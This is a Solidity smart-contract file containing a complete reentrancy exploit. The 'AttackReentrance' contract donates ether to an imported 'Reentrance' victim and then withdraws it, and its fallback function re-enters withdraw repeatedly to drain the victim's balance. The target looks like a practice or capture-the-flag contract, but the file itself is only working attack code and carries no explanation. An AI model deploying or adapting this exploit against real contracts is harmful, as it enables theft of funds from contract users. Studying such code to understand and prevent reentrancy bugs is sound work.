// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Reentrancy.sol";

contract AttackReentrance {
    Reentrance public victim;
    constructor(address payable _victim) {
        victim = Reentrance(_victim);
    }
    function attack() public payable {
        victim.donate{value: msg.value}(address(this));
        victim.withdraw(msg.value);
    }

    fallback() external payable { 
        if (address(victim).balance >= msg.value){
            victim.withdraw(msg.value);
        }
    }

    function getBalance() public view returns(uint256){
        return address(this).balance;

    }
}
